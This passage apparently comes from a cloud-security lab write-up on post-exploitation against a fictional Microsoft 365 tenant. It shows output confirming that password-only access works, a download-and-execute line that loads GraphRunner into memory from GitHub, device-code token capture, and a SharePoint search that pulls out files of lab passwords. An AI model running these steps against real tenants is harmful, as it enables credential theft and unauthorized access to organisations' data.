+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span><span class="p">.</span> <span class="n">Checking</span> <span class="n">MFA</span> <span class="n">now</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[**]</span> <span class="n">MFA</span> <span class="n">is</span> <span class="n">enabled</span> <span class="n">and</span> <span class="n">was</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">account</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">MFA</span> <span class="n">Method</span> <span class="n">Used</span><span class="err">:</span> <span class="n">PhoneAppOTP</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">########################### Legacy Auth Checks ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Exchange</span> <span class="n">Web</span> <span class="n">Services</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Exchange</span> <span class="n">Web</span> <span class="n">Services</span> <span class="p">(</span><span class="n">EWS</span><span class="p">)...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Login</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">O365</span> <span class="n">EWS</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">ActiveSync</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Active</span> <span class="n">Sync</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">InvalidOperation</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Line</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="mf">852</span> <span class="p">|</span>              <span class="nv">$resp</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Exception</span><span class="p">.</span><span class="py">Response</span><span class="p">.</span><span class="py">GetResponseStream</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     <span class="p">|</span>              <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+</span></span><span class="line"><span class="cl">     <span class="p">|</span> <span class="n">Method</span> <span class="n">invocation</span> <span class="n">failed</span> <span class="n">because</span> <span class="p">[</span><span class="no">System.Net.Http.HttpResponseMessage</span><span class="p">]</span> <span class="n">does</span> <span class="n">not</span> <span class="n">contain</span> <span class="n">a</span> <span class="n">method</span> <span class="n">named</span> <span class="s1">&#39;GetResponseStream&#39;</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Login</span> <span class="n">to</span> <span class="n">ActiveSync</span> <span class="n">failed</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">########################### ADFS Check ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">ADFS</span> <span class="n">Authentication</span> <span class="p">----------------</span>                                                                                                                                         
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Getting</span> <span class="n">ADFS</span> <span class="n">URL</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">ADFS</span> <span class="n">does</span> <span class="n">not</span> <span class="n">appear</span> <span class="n">to</span> <span class="n">be</span> <span class="k">in</span> <span class="n">use</span><span class="p">.</span> <span class="n">Authentication</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">managed</span> <span class="n">by</span> <span class="n">Microsoft</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="nb">On-Prem</span> <span class="n">ADFS</span> <span class="n">Portal</span> <span class="n">at</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="c">######### SINGLE FACTOR ACCESS RESULTS #########</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Graph</span> <span class="n">API</span>                  <span class="p">|</span> <span class="n">YES</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span>     <span class="p">|</span> <span class="n">YES</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Windows</span> <span class="n">UA</span>                   <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Linux</span> <span class="n">UA</span>                     <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">MacOS</span> <span class="n">UA</span>                     <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Android</span> <span class="n">UA</span>                   <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">iPhone</span> <span class="n">UA</span>                    <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Windows</span> <span class="n">Phone</span> <span class="n">UA</span>             <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">Exchange</span> <span class="n">Web</span> <span class="n">Services</span> <span class="p">(</span><span class="n">BASIC</span> <span class="n">Auth</span><span class="p">)</span>   <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">Active</span> <span class="n">Sync</span> <span class="p">(</span><span class="n">BASIC</span> <span class="n">Auth</span><span class="p">)</span>             <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADFS</span>                                 <span class="p">|</span> <span class="n">NO</span>
+</span></span></code></pre></div><p>Notice that single-factor authentication (using only a password) is enabled for our current user on both the Microsoft Graph and Microsoft Service Management APIs!</p>
+<p><img loading="lazy" src="https://i.imgur.com/KPZviMM.png"></p>
+<p>Microsoft 365 apps like Outlook, Teams, and SharePoint use the Graph API, allowing us to extract valuable user content for our engagement.</p>
+<ul>
+<li>We can check if our current user has been assigned a Microsoft 365 license.
+<ul>
+<li>Log in to Azure with <code>Connect-AzAccount</code> and <code>Connect-MgGraph</code></li>
+<li>Then we can check for license availability with the <code>Get-MgUserLicenseDetail</code> cmdlet</li>
+</ul>
+</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/M4EX7Gs.png"></p>
+<blockquote>
+<p>The most important information in the above screenshot is the <strong><code>SkuPartNumber</code></strong> value, which indicates the specific Microsoft 365 license assigned to the user. In this case, <strong><code>O365_BUSINESS_ESSENTIALS</code></strong> which allows access to Outlook, Teams, SharePoint and other productivity tools, in the Microsoft 365 suite.</p>
+</blockquote>
+<ul>
+<li>We can use the <code>GraphRunner</code> post-exploitation tool to loot in Microsoft 365 environments.</li>
+<li>We can go ahead and load this tool to powershell memory</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">________</span>                     <span class="n">__</span>      <span class="n">_______</span>      <span class="n">by</span> <span class="n">Beau</span> <span class="n">Bullock</span> <span class="p">(</span><span class="nv">@dafthack</span><span class="p">)</span>                                
+</span></span><span class="line"><span class="cl"> <span class="p">/</span><span class="n">_______</span><span class="p">/</span><span class="n">___________</span>  <span class="n">______</span> <span class="p">|</span>  <span class="p">|</span><span class="n">____</span><span class="p">/</span><span class="n">_______</span><span class="p">\</span><span class="n">__</span> <span class="n">__</span>  <span class="n">____</span>   <span class="n">____</span>   <span class="n">___________</span> 
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">___</span><span class="p">\</span>  <span class="n">__</span><span class="p">\</span><span class="n">______</span><span class="p">\</span><span class="n">____</span><span class="p">\</span> <span class="p">\</span><span class="n">_____</span><span class="p">\|</span><span class="n">__</span><span class="p">|</span><span class="n">__</span><span class="p">\|</span><span class="n">________</span><span class="p">/</span><span class="n">__</span><span class="p">|</span><span class="n">__</span><span class="p">\/</span><span class="n">____</span><span class="p">\</span> <span class="p">/</span><span class="n">____</span><span class="p">\</span><span class="n">_</span><span class="p">/</span><span class="n">____</span><span class="p">\</span><span class="n">______</span><span class="p">\</span>
+</span></span><span class="line"><span class="cl"><span class="p">\</span>    <span class="p">\</span><span class="n">_</span><span class="p">\</span>  <span class="p">\</span>  <span class="p">|</span> <span class="p">\//</span> <span class="n">__</span> <span class="p">\|</span>  <span class="p">|</span><span class="n">_</span><span class="p">/</span> <span class="p">|</span>   <span class="n">Y</span>  <span class="p">\</span>    <span class="p">|</span>   <span class="p">\</span>  <span class="p">|</span>  <span class="p">/</span>   <span class="p">|</span>  <span class="p">\</span>   <span class="p">|</span>  <span class="p">\</span>  <span class="n">___</span><span class="p">/|</span>  <span class="p">|</span> <span class="p">\/</span>
+</span></span><span class="line"><span class="cl"> <span class="p">\</span><span class="n">________</span><span class="p">/</span><span class="n">__</span><span class="p">|</span>  <span class="p">(</span><span class="n">______</span><span class="p">/</span><span class="n">__</span><span class="p">|</span>   <span class="p">|</span><span class="n">___</span><span class="p">|</span><span class="n">__</span><span class="p">|</span><span class="n">____</span><span class="p">|</span><span class="n">___</span><span class="p">/</span><span class="n">____</span><span class="p">/|</span><span class="n">___</span><span class="p">|</span><span class="n">__</span><span class="p">/</span><span class="n">___</span><span class="p">|</span><span class="n">__</span><span class="p">/\</span><span class="n">___</span><span class="p">|</span> <span class="p">&gt;</span><span class="n">__</span><span class="p">|</span>   
+</span></span><span class="line"><span class="cl">                 <span class="k">Do</span> <span class="n">service</span> <span class="n">principals</span> <span class="n">dream</span> <span class="n">of</span> <span class="n">electric</span> <span class="n">sheep</span><span class="p">?</span>
+</span></span><span class="line"><span class="cl">                       
+</span></span><span class="line"><span class="cl"><span class="k">For</span> <span class="n">usage</span> <span class="n">information</span> <span class="n">see</span> <span class="n">the</span> <span class="n">wiki</span> <span class="n">here</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">dafthack</span><span class="p">/</span><span class="n">GraphRunner</span><span class="p">/</span><span class="n">wiki</span>
+</span></span><span class="line"><span class="cl"><span class="n">To</span> <span class="n">list</span> <span class="n">GraphRunner</span> <span class="n">modules</span> <span class="n">run</span> <span class="nb">List-GraphRunnerModules</span>
+</span></span></code></pre></div><p>There is a <a href="https://www.blackhillsinfosec.com/introducing-graphrunner/">blog</a> by Black Hills Information Security which breaks down how to use this tool.</p>
+<ul>
+<li>We can use the below cmdlet to list the available modules.</li>
+</ul>
+<pre tabindex="0"><code>List-GraphRunnerModules
+</code></pre><p><img loading="lazy" src="https://i.imgur.com/XbKY9df.jpeg"></p>
+<p>The <strong>&ldquo;Pillage Modules&rdquo;</strong> looks like the most interesting module though as it focuses on post-exploitation techniques. So first of all let go ahead and authenticate as our current user to the Microsoft Graph API.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-GraphTokens</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">To</span> <span class="n">sign</span> <span class="k">in</span><span class="p">,</span> <span class="n">use</span> <span class="n">a</span> <span class="n">web</span> <span class="n">browser</span> <span class="n">to</span> <span class="n">open</span> <span class="n">the</span> <span class="n">page</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">devicelogin</span> <span class="n">and</span> <span class="n">enter</span> <span class="n">the</span> <span class="n">code</span> <span class="n">G2XDH6EUF</span> <span class="n">to</span> <span class="n">authenticate</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">authorization_pending</span>
+</span></span><span class="line"><span class="cl"><span class="n">aud</span>                 <span class="err">:</span> <span class="mf">00000003</span><span class="p">-</span><span class="mf">0000</span><span class="p">-</span><span class="mf">0000</span><span class="n">-c000</span><span class="p">-</span><span class="mf">000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">iss</span>                 <span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">sts</span><span class="p">.</span><span class="py">windows</span><span class="p">.</span><span class="n">net</span><span class="p">/</span><span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">iat</span>                 <span class="err">:</span> <span class="mf">1728122650</span>
+</span></span><span class="line"><span class="cl"><span class="n">nbf</span>                 <span class="err">:</span> <span class="mf">1728122650</span>
+</span></span><span class="line"><span class="cl"><span class="n">exp</span>                 <span class="err">:</span> <span class="mf">1728126800</span>
+</span></span><span class="line"><span class="cl"><span class="n">acct</span>                <span class="err">:</span> <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">acr</span>                 <span class="err">:</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">aio</span>                 <span class="err">:</span> <span class="n">ATQAy</span><span class="p">/</span><span class="n">8YAAAA05ZBUjMFAJilG6sckNXmDe43</span><span class="p">/</span><span class="n">GFCaL2t9ywVn2fMbkoY9jVqvVH2NRnZZWQ8Mxna</span>
+</span></span><span class="line"><span class="cl"><span class="n">amr</span>                 <span class="err">:</span> <span class="p">{</span><span class="n">pwd</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">app_displayname</span>     <span class="err">:</span> <span class="n">Microsoft</span> <span class="n">Office</span>
+</span></span><span class="line"><span class="cl"><span class="n">appid</span>               <span class="err">:</span> <span class="n">d3590ed6</span><span class="p">-</span><span class="n">52b3</span><span class="p">-</span><span class="mf">4102</span><span class="n">-aeff-aad2292ab01c</span>
+</span></span><span class="line"><span class="cl"><span class="n">appidacr</span>            <span class="err">:</span> <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">idtyp</span>               <span class="err">:</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">ipaddr</span>              <span class="err">:</span> <span class="mf">102.89</span><span class="p">.</span><span class="py">68</span><span class="p">.</span><span class="py">17</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span>                <span class="err">:</span> <span class="n">Clara</span> <span class="n">Miller</span>
+</span></span><span class="line"><span class="cl"><span class="n">oid</span>                 <span class="err">:</span> <span class="n">36fa333d</span><span class="p">-</span><span class="mf">1720</span><span class="p">-</span><span class="mf">4920</span><span class="p">-</span><span class="n">8a5c</span><span class="p">-</span><span class="n">2b9b696c6adf</span>
+</span></span><span class="line"><span class="cl"><span class="p">-</span><span class="n">-SNIP</span><span class="p">--</span>
+</span></span><span class="line"><span class="cl"><span class="n">tenant_region_scope</span> <span class="err">:</span> <span class="n">EU</span>
+</span></span><span class="line"><span class="cl"><span class="n">tid</span>                 <span class="err">:</span> <span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span>
+</span></span><span class="line"><span class="cl"><span class="n">unique_name</span>         <span class="err">:</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">upn</span>                 <span class="err">:</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">uti</span>                 <span class="err">:</span> <span class="n">ColAcrlKl0OTH5BHzLwkAA</span>
+</span></span><span class="line"><span class="cl"><span class="n">ver</span>                 <span class="err">:</span> <span class="mf">1.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">wids</span>                <span class="err">:</span> <span class="p">{</span><span class="n">88d8e3e3</span><span class="p">-</span><span class="n">8f55</span><span class="p">-</span><span class="n">4a1e</span><span class="p">-</span><span class="n">953a</span><span class="p">-</span><span class="n">9b9898b8876b</span><span class="p">,</span> <span class="n">b79fbf4d</span><span class="p">-</span><span class="n">3ef9</span><span class="p">-</span><span class="mf">4689</span><span class="p">-</span><span class="mf">8143</span><span class="p">-</span><span class="n">76b194e85509</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">xms_idrel</span>           <span class="err">:</span> <span class="mf">10</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">xms_tcdt</span>            <span class="err">:</span> <span class="mf">1671311182</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Successful</span> <span class="n">authentication</span><span class="p">.</span> <span class="n">Access</span> <span class="n">and</span> <span class="n">refresh</span> <span class="n">tokens</span> <span class="n">have</span> <span class="n">been</span> <span class="n">written</span> <span class="n">to</span> <span class="n">the</span> <span class="n">global</span> <span class="nv">$tokens</span> <span class="n">variable</span><span class="p">.</span> <span class="n">To</span> <span class="n">use</span> <span class="n">them</span> <span class="n">with</span> <span class="n">other</span> <span class="n">GraphRunner</span> <span class="n">modules</span> <span class="n">use</span> <span class="n">the</span> <span class="n">Tokens</span> <span class="n">flag</span> <span class="p">(</span><span class="n">Example</span><span class="p">.</span> <span class="nb">Invoke-DumpApps</span> <span class="n">-Tokens</span> <span class="nv">$tokens</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[!]</span> <span class="n">Your</span> <span class="n">access</span> <span class="n">token</span> <span class="n">is</span> <span class="nb">set </span><span class="n">to</span> <span class="n">expire</span> <span class="n">on</span><span class="err">:</span> <span class="mf">10</span><span class="p">/</span><span class="mf">05</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">12</span><span class="err">:</span><span class="mf">13</span><span class="err">:</span><span class="mf">20</span>
+</span></span></code></pre></div><p>According to the above output, Some modules will require you use the <code>-Tokens $tokens</code> option, Just in case you don&rsquo;t know what tokens are refer to this <a href="https://www.xintra.org/blog/tokens-in-entra-id-guide">blog</a> by <a href="https://x.com/inversecos">@inversecos</a> to understand more.</p>
+<p><img loading="lazy" src="https://i.imgur.com/zQt1ulT.jpeg"></p>
+<p>It is also possible to view the help page just like the <code>--help</code> option in bash but this time with the below command syntax starting with first <strong>Pillage Module</strong></p>
+<pre tabindex="0"><code>Get-Help Invoke-SearchSharePointAndOneDrive -Examples
+</code></pre><p><img loading="lazy" src="https://i.imgur.com/MoZhYop.png"></p>
+<p>We can then execute this module to search for files containing the string &ldquo;<strong><code>password</code></strong>&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-SearchSharePointAndOneDrive</span> <span class="n">-Tokens</span> <span class="nv">$tokens</span> <span class="n">-SearchTerm</span> <span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">provided</span> <span class="n">access</span> <span class="n">tokens</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Found</span> <span class="mf">2</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">search</span> <span class="n">term</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl"><span class="n">Result</span> <span class="p">[</span><span class="mf">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Name</span><span class="err">:</span> <span class="n">passwords</span><span class="p">.</span><span class="py">xlsx</span>
+</span></span><span class="line"><span class="cl"><span class="n">Location</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">iancloudpwned</span><span class="p">.</span><span class="py">sharepoint</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Shared</span> <span class="n">Documents</span><span class="p">/</span><span class="n">passwords</span><span class="p">.</span><span class="py">xlsx</span>
+</span></span><span class="line"><span class="cl"><span class="n">Created</span> <span class="n">Date</span><span class="err">:</span> <span class="mf">03</span><span class="p">/</span><span class="mf">27</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">00</span><span class="err">:</span><span class="mf">13</span><span class="err">:</span><span class="mf">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">Modified</span> <span class="n">Date</span><span class="err">:</span> <span class="mf">09</span><span class="p">/</span><span class="mf">23</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">21</span><span class="err">:</span><span class="mf">02</span><span class="err">:</span><span class="mf">42</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="err">:</span> <span class="mf">14.79</span> <span class="n">KB</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Preview</span><span class="err">:</span> <span class="p">&lt;</span><span class="n">c0</span><span class="p">&gt;</span><span class="n">passwords</span><span class="p">&lt;/</span><span class="n">c0</span><span class="p">&gt;</span> <span class="n">Site</span> <span class="n">Username</span> <span class="p">&lt;</span><span class="n">c0</span><span class="p">&gt;</span><span class="n">Password</span><span class="p">&lt;/</span><span class="n">c0</span><span class="p">&gt;</span> <span class="n">Azure</span> <span class="n">lindsey_adm</span> <span class="nv">$R4ncher2043</span> <span class="n">Dev</span> <span class="n">Env</span> <span class="n">r</span><span class="p">&amp;</span><span class="n">d</span> <span class="nv">$MEGAPRODUCTS</span><span class="p">-&lt;</span><span class="n">ddd</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DriveID</span> <span class="p">&amp;</span> <span class="n">Item</span> <span class="n">ID</span><span class="err">:</span> <span class="n">b</span><span class="p">!</span><span class="n">bT4vhymq0UWW7LvQnMzGLIicHuknVeZGkE3</span><span class="p">-</span><span class="n">8tuCtaeO-nKW9TKYT7NHHw0ABSux</span><span class="p">\</span><span class="err">:</span><span class="n">017K7QPLPAKVIRHIULQ5BK6A3KQTCK2SCD</span>
+</span></span><span class="line"><span class="cl"><span class="p">================================================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Result</span> <span class="p">[</span><span class="mf">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Name</span><span class="err">:</span> <span class="n">Finance</span> <span class="n">Logins</span><span class="p">.</span><span class="py">docx</span>
+</span></span><span class="line"><span class="cl"><span class="n">Location</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">iancloudpwned</span><span class="p">.</span><span class="py">sharepoint</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">sites</span><span class="p">/</span><span class="n">FinanceTeam</span><span class="p">/</span><span class="n">Shared</span> <span class="n">Documents</span><span class="p">/</span><span class="n">Finance</span> <span class="n">Logins</span><span class="p">.</span><span class="py">docx</span>
+</span></span><span class="line"><span class="cl"><span class="n">Created</span> <span class="n">Date</span><span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">06</span><span class="p">/</span><span class="mf">2023</span> <span class="mf">00</span><span class="err">:</span><span class="mf">17</span><span class="err">:</span><span class="mf">46</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">Modified</span> <span class="n">Date</span><span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">06</span><span class="p">/</span><span class="mf">2023</span> <span class="mf">00</span><span class="err">:</span><span class="mf">17</span><span class="err">:</span><span class="mf">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="err">:</span> <span class="mf">20.74</span> <span class="n">KB</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Preview</span><span class="err">:</span> <span class="p">&lt;</span><span class="n">ddd</span><span class="p">/&gt;&lt;</span><span class="n">c0</span><span class="p">&gt;</span><span class="n">PASSWORDS</span><span class="p">&lt;/</span><span class="n">c0</span><span class="p">&gt;)</span> <span class="n">Service</span><span class="p">/</span><span class="n">Account</span><span class="err">:</span> <span class="n">Finance</span> <span class="n">Database</span> <span class="n">URL</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">11</span><span class="p">.</span><span class="mf">15</span><span class="p">/</span><span class="n">login</span> <span class="n">Username</span><span class="err">:</span> <span class="p">&lt;</span><span class="n">ddd</span><span class="p">/&gt;</span> <span class="p">&lt;</span><span class="n">c0</span><span class="p">&gt;</span><span class="n">Password</span><span class="p">&lt;/</span><span class="n">c0</span><span class="p">&gt;</span><span class="err">:</span> <span class="n">F1n</span><span class="nv">@nc3Db2023</span><span class="p">!</span> <span class="n">Service</span><span class="p">/</span><span class="n">Account</span><span class="err">:</span> <span class="n">Accounting</span> <span class="n">Software</span> <span class="n">URL</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">accounting</span><span class="p">.&lt;</span><span class="n">ddd</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DriveID</span> <span class="p">&amp;</span> <span class="n">Item</span> <span class="n">ID</span><span class="err">:</span> <span class="n">b</span><span class="p">!</span><span class="n">XM0yHkS8s0KPA7drboV7c7bd4PO1jD1BpS2fN8axCu6HW_Ya2jEcSZSebeuGuDsI</span><span class="p">\</span><span class="err">:</span><span class="n">01UALFMSZAKNKICFDDHRH2II4AID3NQRGJ</span>
+</span></span><span class="line"><span class="cl"><span class="p">================================================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="k">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">download</span> <span class="n">any</span> <span class="n">of</span> <span class="n">these</span> <span class="n">files</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">WARNING</span> <span class="p">-</span> <span class="n">Downloading</span> <span class="n">ALL</span> <span class="p">+</span> <span class="mf">2</span> <span class="n">matches</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Now</span> <span class="n">downloading</span> <span class="n">passwords</span><span class="p">.</span><span class="py">xlsx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Now</span> <span class="n">downloading</span> <span class="n">Finance</span> <span class="n">Logins</span><span class="p">.</span><span class="py">docx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="k">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">download</span> <span class="n">any</span> <span class="n">more</span> <span class="n">files</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">No</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Quitting</span><span class="p">...</span>
